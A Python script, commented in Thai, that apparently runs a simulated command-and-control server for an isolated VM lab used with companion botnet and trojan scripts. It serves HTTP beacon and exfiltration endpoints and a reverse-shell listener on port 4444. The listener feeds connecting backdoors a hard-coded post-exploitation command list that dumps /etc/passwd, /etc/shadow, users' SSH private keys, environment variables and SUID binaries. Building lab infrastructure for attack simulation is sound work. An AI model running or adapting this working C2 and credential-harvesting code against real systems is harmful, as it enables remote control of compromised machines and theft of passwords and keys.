"""
c2_server.py - เซิร์ฟเวอร์ C2 จำลอง (รันบน Windows host)

ใช้คู่กับ botnet.sh / trojan_real.sh เพื่อให้ VM มีปลายทางเชื่อมต่อจริง
โดยไม่ต้องต่ออินเทอร์เน็ต

พอร์ต:
    8080  HTTP C2      - beacon / exfiltration (botnet)
    4444  reverse shell - รับ backdoor ที่ connect กลับ แล้วส่ง command
                          เหมือน attacker interact (trojan_real / msfvenom payload)
    3333  echo          - ปลายทาง generic (เผื่อ scenario อื่น)

ใช้งาน:
    python c2_server.py
"""
import socket
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime

# ชุดคำสั่งที่ attacker ส่งเข้า reverse shell หลัง backdoor connect กลับ
# = post-exploitation จริง (recon + credential access + discovery)
# ทั้งหมดรันใน VM (revert หลัง scenario) - ไม่แตะ host
ATTACKER_COMMANDS = [
    "id",
    "uname -a",
    "hostname",
    "whoami",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "ls -la /root/ 2>/dev/null",
    "ps aux | head -20",
    "netstat -tnlp 2>/dev/null | head",
    "find / -perm -4000 -type f 2>/dev/null | head",
    "crontab -l 2>/dev/null",
    "cat /home/*/.ssh/id_rsa 2>/dev/null",
    "env",
    "w",
]

LOCK = threading.Lock()


def log(msg):
    with LOCK:
        print(f"  {datetime.now():%H:%M:%S} {msg}", flush=True)


class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        log(f"[http] {self.address_string()} {fmt % args}")

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        self.rfile.read(n)
        log(f"[http] รับ exfil {n} bytes จาก {self.address_string()}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"RECEIVED")


def reverse_shell_handler(conn, addr):
    """backdoor connect กลับมา -> ส่ง command เหมือน attacker interact
    msfvenom shell_reverse_tcp = /bin/sh ที่ dup2 socket -> รับ stdin จาก C2"""
    log(f"[shell] !! backdoor เชื่อมกลับจาก {addr[0]}:{addr[1]} — เริ่ม interact")
    # shell_reverse_tcp = /bin/sh ที่ dup2 socket, ไม่ส่ง banner -> ส่ง command ได้เลย
    conn.settimeout(1.5)
    try:
        for i, cmd in enumerate(ATTACKER_COMMANDS, 1):
            conn.sendall((cmd + "\n").encode())
            log(f"[shell] ส่งคำสั่ง {i}/{len(ATTACKER_COMMANDS)}: {cmd}")
            time.sleep(0.5)
            # อ่าน output จนกว่าจะเงียบ (timeout)
            try:
                while conn.recv(16384):
                    pass
            except socket.timeout:
                pass
        conn.sendall(b"exit\n")
    except (ConnectionResetError, BrokenPipeError, OSError):
        pass
    finally:
        log(f"[shell] ปิด session {addr[0]}")
        try:
            conn.close()
        except OSError:
            pass


def echo_listener(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(5)
    log(f"[*] echo listener :{port}")
    while True:
        try:
            conn, addr = s.accept()
            data = conn.recv(4096)
            log(f"[tcp:{port}] {addr[0]} -> {data[:60]!r}")
            conn.sendall(b"OK\n")
            conn.close()
        except OSError:
            pass


def shell_listener(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(5)
    log(f"[*] reverse-shell listener :{port} (รอ backdoor)")
    while True:
        try:
            conn, addr = s.accept()
            threading.Thread(target=reverse_shell_handler,
                             args=(conn, addr), daemon=True).start()
        except OSError:
            pass


if __name__ == "__main__":
    threading.Thread(target=shell_listener, args=(4444,), daemon=True).start()
    threading.Thread(target=echo_listener, args=(3333,), daemon=True).start()
    log("[*] HTTP C2 :8080  |  reverse-shell :4444  |  echo :3333")
    print("[*] กด Ctrl+C เพื่อหยุด\n")
    try:
        HTTPServer(("0.0.0.0", 8080), C2Handler).serve_forever()
    except KeyboardInterrupt:
        print("\n[*] หยุดแล้ว")
